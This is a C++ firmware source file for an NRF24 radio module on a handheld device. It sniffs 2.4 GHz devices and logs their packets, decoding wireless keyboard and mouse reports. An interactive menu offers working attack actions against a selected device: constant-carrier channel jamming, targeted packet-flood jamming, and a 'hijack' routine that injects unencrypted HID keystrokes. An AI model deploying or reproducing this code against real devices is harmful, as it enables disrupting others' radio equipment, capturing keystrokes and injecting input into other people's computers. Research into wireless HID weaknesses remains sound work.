#include "nrf_sniffer.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "nrf_common.h"
#include <globals.h>
#include <algorithm>
#include <cstring>
#include <vector>

namespace {
String addrToString(const uint8_t a[5]) {
    char buf[16];
    snprintf(buf, sizeof(buf), "%02X%02X%02X%02X%02X", a[0], a[1], a[2], a[3], a[4]);
    return String(buf);
}

std::pair<String, String> guessVendor(const uint8_t a[5]) {
    struct Prefix {
        uint8_t p0;
        uint8_t p1;
        const char *vendor;
        const char *type;
    };
    static const Prefix prefixes[] = {
        {0xE7, 0xE7, "Nordic (default)", "Dev/Examples"},
        {0xC2, 0xC2, "Logitech/ESB (guess)", "HID Dongle"},
        {0xAA, 0xAA, "Toy/Clone", "SimpleTX"},
        {0x55, 0x55, "Generic", "Unknown"},
    };
    for (const auto &p : prefixes) {
        if (a[0] == p.p0 && a[1] == p.p1) return {p.vendor, p.type};
    }
    return {"Unknown", "Unknown"};
}

void addOrUpdate(
    std::vector<NrfSniffedDevice> &devices, const uint8_t fullAddr[5], uint8_t channel, uint8_t pipe,
    const uint8_t *payload, uint8_t len
) {
    const auto vend = guessVendor(fullAddr);
    const uint32_t now = millis();

    auto it = std::find_if(devices.begin(), devices.end(), [&](const NrfSniffedDevice &d) {
        return memcmp(d.addr, fullAddr, 5) == 0;
    });
    if (it == devices.end()) {
        NrfSniffedDevice d{};
        memcpy(d.addr, fullAddr, 5);
        d.channel = channel;
        d.pipe = pipe;
        d.firstSeen = now;
        d.lastSeen = now;
        d.hits = 1;
        d.sampleLen = len;
        if (len > 0 && len <= 32 && payload) memcpy(d.sample, payload, len);
        d.vendor = vend.first;
        d.type = vend.second;
        devices.push_back(d);
    } else {
        it->hits++;
        it->lastSeen = now;
        it->channel = channel;
        it->pipe = pipe;
        if (it->sampleLen == 0 && len > 0 && len <= 32 && payload) {
            it->sampleLen = len;
            memcpy(it->sample, payload, len);
        }
        if (it->vendor == "Unknown") {
            it->vendor = vend.first;
            it->type = vend.second;
        }
    }
}

void renderUI(const std::vector<NrfSniffedDevice> &devices, uint8_t channel) {
    drawMainBorder();
    tft.setCursor(10, 20);
    tft.setTextSize(FM);
    tft.println("NRF24 Sniffer");
    tft.setTextSize(FP);
    tft.printf("Scanning CH %u   Found: %u\n", channel, (unsigned)devices.size());
    tft.println("ESC to exit");

    // Show top devices by hit count
    std::vector<NrfSniffedDevice> sorted = devices;
    std::sort(sorted.begin(), sorted.end(), [](const NrfSniffedDevice &a, const NrfSniffedDevice &b) {
        return a.hits > b.hits;
    });

    int y = 70;
    const int maxRows = 6;
    for (int i = 0; i < (int)sorted.size() && i < maxRows; ++i) {
        const auto &d = sorted[i];
        tft.setCursor(10, y);
        tft.printf("CH%3u %s (%lu)", d.channel, addrToString(d.addr).c_str(), (unsigned long)d.hits);
        y += 14;
        tft.setCursor(10, y);
        tft.printf("%s / %s", d.vendor.c_str(), d.type.c_str());
        y += 16;
    }
}
} // namespace

// Forward declarations for interactive sniffer helper functions
static void nrf_monitor_device(const NrfSniffedDevice &device);
static void nrf_jam_channel(uint8_t channel);
static void nrf_jam_targeted(const NrfSniffedDevice &device);
static void nrf_try_hijack(const NrfSniffedDevice &device);

// Helper to format address for display (duplicated from namespace for use in interactive functions)
static String formatAddr(const uint8_t a[5]) {
    char buf[16];
    snprintf(buf, sizeof(buf), "%02X%02X%02X%02X%02X", a[0], a[1], a[2], a[3], a[4]);
    return String(buf);
}

static void configureSniffer() {
    NRFradio.setAutoAck(false);
    NRFradio.disableCRC();
    NRFradio.enableDynamicPayloads();
    NRFradio.setAddressWidth(2); // shorter AW lets us pull the remaining bytes from payload
    NRFradio.setPayloadSize(32);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setDataRate(RF24_1MBPS); // best compatibility with most ESB devices
    NRFradio.openReadingPipe(0, 0xFFFF);
    NRFradio.startListening();
}

static void collectDevices(std::vector<NrfSniffedDevice> &devices, uint32_t scanTimeMs, uint16_t dwellPerChannelMs) {
    if (!nrf_start()) {
        Serial.println("Fail Starting radio");
        return;
    }

    configureSniffer();
    uint8_t channel = 2;
    const unsigned long endAt = millis() + scanTimeMs;

    while ((long)(endAt - millis()) > 0) {
        NRFradio.setChannel(channel);
        unsigned long listenStart = millis();

        while (millis() - listenStart < dwellPerChannelMs) {
            uint8_t pipe = 0;
            while (NRFradio.available(&pipe)) {
                uint8_t len = NRFradio.getDynamicPayloadSize();
                if (len < 3 || len > 32) {
                    NRFradio.flush_rx();
                    break;
                }

                uint8_t payload[32];
                NRFradio.read(payload, len);

                uint8_t fullAddr[5] = {0xFF, 0xFF, payload[0], payload[1], payload[2]};
                addOrUpdate(devices, fullAddr, channel, pipe, payload, len);
            }
        }

        channel = (channel >= 125) ? 1 : channel + 1;
    }

    NRFradio.stopListening();
    NRFradio.powerDown();
}

std::vector<NrfSniffedDevice> nrf_sniffer_collect(uint32_t scanTimeMs, uint16_t dwellPerChannelMs) {
    std::vector<NrfSniffedDevice> devices;
    collectDevices(devices, scanTimeMs, dwellPerChannelMs);
    return devices;
}

void nrf_sniffer() {
    if (!nrf_start()) {
        Serial.println("Fail Starting radio");
        displayError("NRF24 not found");
        delay(500);
        return;
    }

    configureSniffer();

    std::vector<NrfSniffedDevice> devices;
    uint8_t channel = 2;
    unsigned long lastDraw = 0;

    renderUI(devices, channel);

    while (!check(EscPress)) {
        NRFradio.setChannel(channel);
        unsigned long listenStart = millis();

        while (millis() - listenStart < 40 && !check(EscPress)) {
            uint8_t pipe = 0;
            while (NRFradio.available(&pipe) && !check(EscPress)) {
                uint8_t len = NRFradio.getDynamicPayloadSize();
                if (len < 3 || len > 32) {
                    NRFradio.flush_rx();
                    break;
                }

                uint8_t payload[32];
                NRFradio.read(payload, len);

                uint8_t fullAddr[5] = {0xFF, 0xFF, payload[0], payload[1], payload[2]};
                addOrUpdate(devices, fullAddr, channel, pipe, payload, len);
            }
        }

        channel++;
        if (channel > 125) channel = 1;

        if (millis() - lastDraw > 400) {
            renderUI(devices, channel);
            lastDraw = millis();
        }
    }

    NRFradio.stopListening();
    NRFradio.powerDown();
}

void nrf_packet_analyzer() {
    if (!nrf_start()) {
        Serial.println("Fail Starting radio for packet analyzer");
        displayError("NRF24 not found");
        delay(500);
        return;
    }

    // Get filesystem for logging
    FS *fs = nullptr;
    bool canLog = getFsStorage(fs) && fs;
    File logFile;

    if (canLog) {
        String filename = "/nrf_packets_" + String(millis()) + ".log";
        logFile = fs->open(filename.c_str(), FILE_WRITE);
        if (logFile) {
            logFile.println("=== NRF24 Packet Analyzer Log ===");
            logFile.printf("Started: %lu ms\n", millis());
            logFile.println("Format: [timestamp] CH:channel ADDR:address PIPE:pipe LEN:length DATA:hex [DECODED]");
            logFile.println("---");
            Serial.printf("[NRF] Logging to: %s\n", filename.c_str());
        }
    }

    configureSniffer();

    struct PacketCapture {
        uint32_t timestamp;
        uint8_t channel;
        uint8_t addr[5];
        uint8_t pipe;
        uint8_t len;
        uint8_t data[32];
    };

    std::vector<PacketCapture> recentPackets;
    const size_t maxRecentPackets = 50;

    uint8_t channel = 2;
    unsigned long lastDraw = 0;
    uint32_t totalPackets = 0;
    std::vector<NrfSniffedDevice> devices;

    drawMainBorder();
    tft.setCursor(10, 20);
    tft.setTextSize(FM);
    tft.println("NRF24 Packet Analyzer");
    tft.setTextSize(FP);
    tft.println("Capturing and logging...");
    tft.println("ESC to stop");

    while (!check(EscPress)) {
        NRFradio.setChannel(channel);
        unsigned long listenStart = millis();

        while (millis() - listenStart < 40 && !check(EscPress)) {
            uint8_t pipe = 0;
            while (NRFradio.available(&pipe)) {
                uint8_t len = NRFradio.getDynamicPayloadSize();
                if (len < 3 || len > 32) {
                    NRFradio.flush_rx();
                    break;
                }

                uint8_t payload[32];
                NRFradio.read(payload, len);

                // Full address extraction
                uint8_t fullAddr[5] = {0xFF, 0xFF, payload[0], payload[1], payload[2]};

                // Store packet
                PacketCapture cap;
                cap.timestamp = millis();
                cap.channel = channel;
                memcpy(cap.addr, fullAddr, 5);
                cap.pipe = pipe;
                cap.len = len;
                memcpy(cap.data, payload, len);

                recentPackets.push_back(cap);
                if (recentPackets.size() > maxRecentPackets) {
                    recentPackets.erase(recentPackets.begin());
                }

                totalPackets++;

                // Update device list
                addOrUpdate(devices, fullAddr, channel, pipe, payload, len);

                // Decode packet type
                String decoded = "RAW";
                if (len >= 8) {
                    // Check if HID keyboard report (8 bytes)
                    if (payload[0] < 0x08 && payload[2] < 0xE8) {
                        decoded = "HID_KBD";
                        if (payload[2] != 0) {
                            decoded += " KEY:0x";
                            decoded += String(payload[2], HEX);
                        }
                        if (payload[0] != 0) {
                            decoded += " MOD:0x";
                            decoded += String(payload[0], HEX);
                        }
                    }
                    // Check if HID mouse report
                    else if (payload[0] < 0x08 && len == 8) {
                        decoded = "HID_MOUSE";
                        if (payload[0] != 0) decoded += " BTN:" + String(payload[0]);
                        if ((int8_t)payload[1] != 0 || (int8_t)payload[2] != 0) {
                            decoded += " X:" + String((int8_t)payload[1]);
                            decoded += " Y:" + String((int8_t)payload[2]);
                        }
                    }
                }

                // Log to file
                if (logFile) {
                    logFile.printf("[%lu] CH:%u ADDR:%02X%02X%02X%02X%02X PIPE:%u LEN:%u DATA:",
                        cap.timestamp, cap.channel,
                        cap.addr[0], cap.addr[1], cap.addr[2], cap.addr[3], cap.addr[4],
                        cap.pipe, cap.len);
                    for (uint8_t i = 0; i < cap.len; i++) {
                        logFile.printf("%02X", cap.data[i]);
                        if (i < cap.len - 1) logFile.print(" ");
                    }
                    logFile.printf(" [%s]\n", decoded.c_str());
                    logFile.flush();
                }

                // Log to serial
                Serial.printf("[NRF] CH:%u ADDR:%02X%02X%02X%02X%02X LEN:%u [%s]\n",
                    cap.channel,
                    cap.addr[0], cap.addr[1], cap.addr[2], cap.addr[3], cap.addr[4],
                    cap.len, decoded.c_str());
            }
        }

        channel++;
        if (channel > 125) channel = 1;

        // Update UI
        if (millis() - lastDraw > 500) {
            drawMainBorder();
            tft.setCursor(10, 20);
            tft.setTextSize(FM);
            tft.println("NRF24 Packet Analyzer");
            tft.setTextSize(FP);
            tft.printf("CH: %u  Total: %lu\n", channel, totalPackets);
            tft.printf("Devices: %u  Log: %s\n", devices.size(), canLog ? "YES" : "NO");
            tft.println("ESC to stop");
            tft.println("---");

            // Show recent packets
            int y = 80;
            int shown = 0;
            for (int i = recentPackets.size() - 1; i >= 0 && shown < 5; i--, shown++) {
                const auto &p = recentPackets[i];
                tft.setCursor(10, y);
                tft.printf("CH%u %02X%02X%02X", p.channel, p.addr[2], p.addr[3], p.addr[4]);

                // Decode type inline
                if (p.len >= 8) {
                    if (p.data[0] < 0x08 && p.data[2] < 0xE8) {
                        tft.print(" KBD");
                    } else if (p.data[0] < 0x08) {
                        tft.print(" MOUSE");
                    } else {
                        tft.print(" DATA");
                    }
                } else {
                    tft.printf(" L%u", p.len);
                }

                y += 12;
            }

            // Show device summary
            if (devices.size() > 0) {
                y += 10;
                tft.setCursor(10, y);
                tft.println("Active devices:");
                y += 12;

                // Sort by hits
                std::vector<NrfSniffedDevice> sorted = devices;
                std::sort(sorted.begin(), sorted.end(), [](const NrfSniffedDevice &a, const NrfSniffedDevice &b) {
                    return a.hits > b.hits;
                });

                for (size_t i = 0; i < sorted.size() && i < 3; i++) {
                    tft.setCursor(10, y);
                    tft.printf("%s (%lu)", addrToString(sorted[i].addr).c_str(), sorted[i].hits);
                    y += 12;
                }
            }

            lastDraw = millis();
        }
    }

    if (logFile) {
        logFile.println("---");
        logFile.printf("Ended: %lu ms\n", millis());
        logFile.printf("Total packets captured: %lu\n", totalPackets);
        logFile.close();
        Serial.println("[NRF] Log file closed");
    }

    NRFradio.stopListening();
    NRFradio.powerDown();

    drawMainBorder();
    tft.setCursor(10, 20);
    tft.setTextSize(FM);
    tft.println("Packet Analysis Complete");
    tft.setTextSize(FP);
    tft.printf("Total packets: %lu\n", totalPackets);
    tft.printf("Unique devices: %u\n", devices.size());
    if (canLog) {
        tft.println("Log saved to SD card");
    }
    tft.println("\nEsc to exit");
    while (!check(EscPress)) delay(20);
}

// Interactive sniffer with device selection and actions
void nrf_sniffer_interactive() {
    if (!nrf_start()) {
        Serial.println("Fail Starting radio");
        displayError("NRF24 not found");
        delay(500);
        return;
    }

    configureSniffer();

    std::vector<NrfSniffedDevice> devices;
    uint8_t channel = 2;
    unsigned long scanStart = millis();
    const uint32_t SCAN_TIME_MS = 10000; // 10 seconds initial scan
    bool scanning = true;

    // Initial scan phase
    drawMainBorder();
    tft.setCursor(10, 20);
    tft.setTextSize(FM);
    tft.println("NRF24 Interactive Sniffer");
    tft.setTextSize(FP);
    tft.println("");
    tft.println("Scanning for devices...");
    tft.println("");
    tft.printf("Time: 0/%d sec\n", SCAN_TIME_MS / 1000);
    tft.println("ESC to cancel");

    unsigned long lastDraw = 0;
    while (scanning && !check(EscPress)) {
        NRFradio.setChannel(channel);
        unsigned long listenStart = millis();

        while (millis() - listenStart < 40 && !check(EscPress)) {
            uint8_t pipe = 0;
            while (NRFradio.available(&pipe) && !check(EscPress)) {
                uint8_t len = NRFradio.getDynamicPayloadSize();
                if (len < 3 || len > 32) {
                    NRFradio.flush_rx();
                    break;
                }

                uint8_t payload[32];
                NRFradio.read(payload, len);

                uint8_t fullAddr[5] = {0xFF, 0xFF, payload[0], payload[1], payload[2]};
                addOrUpdate(devices, fullAddr, channel, pipe, payload, len);
            }
        }

        channel++;
        if (channel > 125) channel = 1;

        // Update scan progress
        if (millis() - lastDraw > 500) {
            uint32_t elapsed = (millis() - scanStart) / 1000;
            tft.fillRect(10, 70, tftWidth - 20, 40, bruceConfig.bgColor);
            tft.setCursor(10, 70);
            tft.printf("Time: %lu/%d sec\n", elapsed, SCAN_TIME_MS / 1000);
            tft.printf("Found: %u devices\n", devices.size());
            tft.println("ESC to cancel");
            lastDraw = millis();
        }

        if (millis() - scanStart >= SCAN_TIME_MS) {
            scanning = false;
        }
    }

    NRFradio.stopListening();
    NRFradio.powerDown();

    if (check(EscPress) || devices.size() == 0) {
        if (devices.size() == 0) {
            displayError("No devices found");
            delay(2000);
        }
        return;
    }

    // Sort devices by hit count
    std::sort(devices.begin(), devices.end(), [](const NrfSniffedDevice &a, const NrfSniffedDevice &b) {
        return a.hits > b.hits;
    });

    // Device selection menu
    int selectedIndex = 0;
    bool deviceSelected = false;

    while (!deviceSelected && !check(EscPress)) {
        drawMainBorder();
        tft.setCursor(10, 20);
        tft.setTextSize(FM);
        tft.println("Select Device");
        tft.setTextSize(FP);
        tft.printf("Found: %u devices\n", devices.size());
        tft.println("---");

        // Show 5 devices at a time
        int startIdx = (selectedIndex / 5) * 5;
        int endIdx = min(startIdx + 5, (int)devices.size());

        int y = 70;
        for (int i = startIdx; i < endIdx; i++) {
            const auto &d = devices[i];
            tft.setCursor(10, y);

            if (i == selectedIndex) {
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.print("> ");
            } else {
                tft.print("  ");
            }

            tft.printf("CH%u %02X%02X%02X", d.channel, d.addr[2], d.addr[3], d.addr[4]);
            tft.printf(" (%lu)", d.hits);

            if (i == selectedIndex) {
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            }

            y += 16;
        }

        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setCursor(10, tftHeight - 20);
        tft.println("Rotate: Navigate");
        tft.println("SEL: Select  ESC: Exit");

        // Handle input (encoder rotation)
        if (check(PrevPress)) {
            selectedIndex = (selectedIndex > 0) ? selectedIndex - 1 : devices.size() - 1;
            delay(100);
        } else if (check(NextPress)) {
            selectedIndex = (selectedIndex + 1) % devices.size();
            delay(100);
        } else if (check(SelPress)) {
            deviceSelected = true;
            delay(100);
        } else {
            delay(50);
        }
    }

    if (check(EscPress)) return;

    // Show device details and actions
    const auto &selectedDevice = devices[selectedIndex];

    // Action menu with encoder
    int actionIndex = 0;
    const int actionCount = 4;
    const char* actionNames[] = {
        "Monitor device",
        "Jam channel",
        "Targeted jam",
        "Try hijack"
    };

    while (!check(EscPress)) {
        drawMainBorder();
        tft.setCursor(10, 20);
        tft.setTextSize(FM);
        tft.println("Device Details");
        tft.setTextSize(FP);
        tft.println("---");
        tft.printf("Addr: %s\n", formatAddr(selectedDevice.addr).c_str());
        tft.printf("Channel: %u (2.%d GHz)\n", selectedDevice.channel, 400 + selectedDevice.channel);
        tft.printf("Packets: %lu\n", selectedDevice.hits);
        tft.println("---");
        tft.println("Select action:");

        // Show all actions with current selection highlighted
        for (int i = 0; i < actionCount; i++) {
            tft.setCursor(10, 100 + i * 14);
            if (i == actionIndex) {
                tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
                tft.print("> ");
            } else {
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.print("  ");
            }
            tft.println(actionNames[i]);
        }

        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setCursor(10, tftHeight - 20);
        tft.println("Rotate: Select  SEL: Run");
        tft.println("ESC: Back");

        // Handle encoder rotation for action selection
        if (check(PrevPress)) {
            actionIndex = (actionIndex > 0) ? actionIndex - 1 : actionCount - 1;
            delay(100);
        } else if (check(NextPress)) {
            actionIndex = (actionIndex + 1) % actionCount;
            delay(100);
        } else if (check(SelPress)) {
            // Execute selected action
            switch (actionIndex) {
                case 0:
                    nrf_monitor_device(selectedDevice);
                    break;
                case 1:
                    nrf_jam_channel(selectedDevice.channel);
                    break;
                case 2:
                    nrf_jam_targeted(selectedDevice);
                    break;
                case 3:
                    nrf_try_hijack(selectedDevice);
                    break;
            }
            // No additional delay after action - let function handle it
        } else {
            delay(50);
        }
    }
}

// Monitor specific device
static void nrf_monitor_device(const NrfSniffedDevice &device) {
    if (!nrf_start()) {
        displayError("NRF24 Init Failed");
        delay(2000);
        return;
    }

    configureSniffer();

    drawMainBorder();
    tft.setCursor(10, 20);
    tft.setTextSize(FM);
    tft.println("Monitoring Device");
    tft.setTextSize(FP);
    tft.println("---");
    tft.printf("Addr: %02X%02X%02X\n", device.addr[2], device.addr[3], device.addr[4]);
    tft.printf("Channel: %u\n", device.channel);
    tft.println("---");

    uint32_t packetCount = 0;
    unsigned long lastDraw = millis();
    unsigned long lastPacket = millis();

    NRFradio.setChannel(device.channel);

    while (!check(EscPress)) {
        uint8_t pipe = 0;
        while (NRFradio.available(&pipe)) {
            uint8_t len = NRFradio.getDynamicPayloadSize();
            if (len < 3 || len > 32) {
                NRFradio.flush_rx();
                break;
            }

            uint8_t payload[32];
            NRFradio.read(payload, len);

            // Check if it's from our target
            if (payload[0] == device.addr[2] &&
                payload[1] == device.addr[3] &&
                payload[2] == device.addr[4]) {
                packetCount++;
                lastPacket = millis();
            }
        }

        if (millis() - lastDraw > 500) {
            tft.fillRect(10, 80, tftWidth - 20, 60, bruceConfig.bgColor);
            tft.setCursor(10, 80);
            tft.printf("Packets: %lu\n", packetCount);
            tft.printf("Last: %lu ms ago\n", millis() - lastPacket);
            tft.println("");
            tft.println("ESC to stop");
            lastDraw = millis();
        }

        delay(10);
    }

    NRFradio.stopListening();
    NRFradio.powerDown();
}

// Jam specific channel
static void nrf_jam_channel(uint8_t channel) {
    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) {
        displayError("NRF24 Init Failed");
        delay(2000);
        return;
    }

    NRFradio.setAutoAck(false);
    NRFradio.disableCRC();
    NRFradio.setDataRate(RF24_1MBPS);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setChannel(channel);
    NRFradio.stopListening();

    drawMainBorder();
    tft.setCursor(10, 20);
    tft.setTextSize(FM);
    tft.println("Channel Jamming");
    tft.setTextSize(FP);
    tft.println("");
    tft.printf("Channel: %u\n", channel);
    tft.printf("Frequency: %d MHz\n", 2400 + channel);
    tft.println("");
    tft.println("Status: ACTIVE");
    tft.println("");
    tft.println("ESC to stop");

    NRFradio.startConstCarrier(RF24_PA_MAX, channel);

    while (!check(EscPress)) {
        delay(20);
    }

    NRFradio.stopConstCarrier();
    NRFradio.powerDown();
}

// Targeted jamming - spam packets with same address
static void nrf_jam_targeted(const NrfSniffedDevice &device) {
    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) {
        displayError("NRF24 Init Failed");
        delay(2000);
        return;
    }

    NRFradio.setAutoAck(false);
    NRFradio.setCRCLength(RF24_CRC_16);
    NRFradio.setDataRate(RF24_1MBPS);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setChannel(device.channel);
    NRFradio.stopListening();

    // Set pipe address to match target
    uint64_t pipeAddr = ((uint64_t)device.addr[0] << 32) |
                        ((uint64_t)device.addr[1] << 24) |
                        ((uint64_t)device.addr[2] << 16) |
                        ((uint64_t)device.addr[3] << 8) |
                        device.addr[4];
    NRFradio.openWritingPipe(pipeAddr);

    drawMainBorder();
    tft.setCursor(10, 20);
    tft.setTextSize(FM);
    tft.println("Targeted Jamming");
    tft.setTextSize(FP);
    tft.println("");
    tft.printf("Target: %02X%02X%02X\n", device.addr[2], device.addr[3], device.addr[4]);
    tft.printf("Channel: %u\n", device.channel);
    tft.println("");

    uint32_t packetCount = 0;
    unsigned long lastDisplay = millis();

    while (!check(EscPress)) {
        uint8_t payload[32];
        // Craft payload mimicking target address structure
        payload[0] = device.addr[2];
        payload[1] = device.addr[3];
        payload[2] = device.addr[4];

        // Fill rest with random noise
        for (int i = 3; i < 32; i++) {
            payload[i] = random(0, 256);
        }

        NRFradio.write(payload, 32);
        packetCount++;

        if (millis() - lastDisplay > 500) {
            tft.fillRect(10, 80, tftWidth - 20, 30, bruceConfig.bgColor);
            tft.setCursor(10, 80);
            tft.printf("Packets: %lu\n", packetCount);
            tft.println("ESC to stop");
            lastDisplay = millis();
        }

        delay(1);
    }

    NRFradio.powerDown();
}

// Try to hijack the device (send HID commands)
static void nrf_try_hijack(const NrfSniffedDevice &device) {
    drawMainBorder();
    tft.setCursor(10, 20);
    tft.setTextSize(FM);
    tft.println("Hijack Attempt");
    tft.setTextSize(FP);
    tft.println("");
    tft.printf("Target: %02X%02X%02X\n", device.addr[2], device.addr[3], device.addr[4]);
    tft.printf("Channel: %u\n", device.channel);
    tft.println("");
    tft.println("Attempting HID injection...");
    tft.println("");
    tft.println("This requires the device");
    tft.println("to be vulnerable to");
    tft.println("unencrypted HID commands");
    tft.println("");
    tft.println("Press any key to continue");

    while (!check(AnyKeyPress) && !check(EscPress)) {
        delay(50);
    }

    if (check(EscPress)) return;

    NRF24_MODE mode = nrf_setMode();
    if (!nrf_start(mode)) {
        displayError("NRF24 Init Failed");
        delay(2000);
        return;
    }

    NRFradio.setAutoAck(false);
    NRFradio.setDataRate(RF24_1MBPS);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setChannel(device.channel);
    NRFradio.stopListening();

    uint64_t pipeAddr = ((uint64_t)device.addr[0] << 32) |
                        ((uint64_t)device.addr[1] << 24) |
                        ((uint64_t)device.addr[2] << 16) |
                        ((uint64_t)device.addr[3] << 8) |
                        device.addr[4];
    NRFradio.openWritingPipe(pipeAddr);

    drawMainBorder();
    tft.setCursor(10, 20);
    tft.setTextSize(FM);
    tft.println("Hijack Active");
    tft.setTextSize(FP);
    tft.println("");
    tft.println("Sending test HID payload...");
    tft.println("(Keyboard 'A' keypress)");

    // Send HID keyboard report for 'A' key
    uint8_t hidPayload[8];
    hidPayload[0] = 0x00; // Modifier
    hidPayload[1] = 0x00; // Reserved
    hidPayload[2] = 0x04; // 'A' key (HID code)
    hidPayload[3] = 0x00;
    hidPayload[4] = 0x00;
    hidPayload[5] = 0x00;
    hidPayload[6] = 0x00;
    hidPayload[7] = 0x00;

    bool success = false;
    for (int attempt = 0; attempt < 10; attempt++) {
        if (NRFradio.write(hidPayload, 8)) {
            success = true;
        }
        delay(50);

        // Send key release
        memset(hidPayload, 0, 8);
        NRFradio.write(hidPayload, 8);
        delay(50);
    }

    NRFradio.powerDown();

    tft.fillRect(10, 80, tftWidth - 20, 40, bruceConfig.bgColor);
    tft.setCursor(10, 80);
    if (success) {
        tft.println("Payload sent successfully!");
        tft.println("Check target for 'A' key");
    } else {
        tft.println("Send failed - device may");
        tft.println("not be vulnerable");
    }
    tft.println("");
    tft.println("Press any key");

    while (!check(AnyKeyPress) && !check(EscPress)) {
        delay(50);
    }
}
